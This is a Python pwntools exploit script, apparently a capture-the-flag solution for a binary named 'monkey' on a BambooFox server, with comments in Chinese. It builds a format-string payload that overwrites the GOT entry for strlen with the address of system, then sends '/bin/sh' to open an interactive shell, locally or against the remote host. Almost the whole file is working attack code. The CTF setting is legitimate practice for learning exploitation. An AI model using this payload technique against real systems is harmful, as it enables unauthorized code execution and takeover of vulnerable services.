#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
思路：将strlen的got表项替换为system的地址

got['strlen'] <- plt['system'] + 6
0x80485[f6] <- 0x80485[c6]
"""

import sys
from pwn import *


context(arch='i386', os='linux')
context.log_level = 'debug'

fn = './monkey'
elf = ELF(fn)

if len(sys.argv) == 1:
    io = process(fn)
else:
    io = remote('bamboofox.cs.nctu.edu.tw', 11000)

# def exec_fmt(payload):
#     io.sendlineafter('choice!\n', '2')
#     io.recvuntil('out.\n')
#     io.sendline(payload)
#     return io.recvuntil('\n\n', drop=True)

# autofmt = FmtStr(exec_fmt)
# offset = autofmt.offset
offset = 7
# autofmt = FmtStr(exec_fmt, offset=offset)

system_addr = elf.plt['system'] + 6
log.info('system_addr = %s', hex(system_addr))
strlen_got = elf.got['strlen']
log.info('strlen_got = %s', hex(strlen_got))

# payload = fmtstr_payload(offset, {strlen_got: (system_addr & 0xff)}, numbwritten=0, write_size='byte')
# 这样生成的payload好像不太对

payload = ''.join([
    p32(strlen_got),
    '%{}c%{}$hhn'.format((system_addr & 0xff) - 4, offset),
])

io.sendlineafter('choice!\n', '2')
io.recvuntil('out.\n')
io.sendline(payload)
io.sendlineafter('choice!\n', '1')
# 这里远程好像会出不来，但直接send就对了
# io.sendlineafter('characters\n', '/bin/sh')
sleep(1)
io.sendline('/bin/sh')

io.interactive()
